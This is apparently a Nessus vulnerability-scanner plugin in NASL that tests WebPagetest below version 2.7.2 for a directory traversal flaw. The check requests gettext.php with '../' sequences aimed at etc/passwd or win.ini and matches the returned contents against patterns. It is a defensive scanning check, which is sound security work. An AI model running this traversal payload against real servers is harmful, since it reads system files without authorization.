#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62184);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_bugtraq_id(54442);
  script_osvdb_id(83818);
  script_xref(name:"EDB-ID", value:"19790");

  script_name(english:"WebPagetest < 2.7.2 file Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries a directory traversal attack");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WebPagetest install hosted on the remote web server fails to
sanitize user input to the 'file' parameter of the 'gettext.php' script
of directory traversal sequences before using it to return the contents
of a file.  An unauthenticated, remote attacker can exploit this to view
the contents of files located outside of the server's root directory. 

Note that the application also reportedly contains multiple file
disclosure and arbitrary file upload vulnerabilities, although Nessus
has not tested for those.");
  #https://sites.google.com/a/webpagetest.org/docs/private-instances/releases/webpagetest-2-7
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6930f2b1");
  script_set_attribute(attribute:"solution", value:
"Update to version 2.7.2, which is reported to address the
vulnerability."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"WebPagetest 2.6 File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2012/07/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/07/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/09/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:webpagetest:webpagetest");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("webpagetest_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/webpagetest", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "webpagetest",
  port         : port,
  exit_on_fail : TRUE
);
dir = install["dir"];

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";


foreach file (files)
{
  vuln_url = dir + "/gettext.php?file=../../../../../../../../../../../" + file;
  res = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : vuln_url,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      if ('win.ini' >< file) file = str_replace(find:'/', replace:'\\', string:'/'+file);

      header =
        'Nessus was able to exploit the issue to retrieve the contents of\n' +
        "'" + file + "' on the remote host using the following URL";
      trailer = '';

      if (report_verbosity > 1)
      {
        trailer = 
          'Here are its contents :\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          res[2] +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }
      report = get_vuln_report(items:vuln_url, port:port, header:header, trailer:trailer);
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "WebPagetest", build_url(qs:dir, port:port));
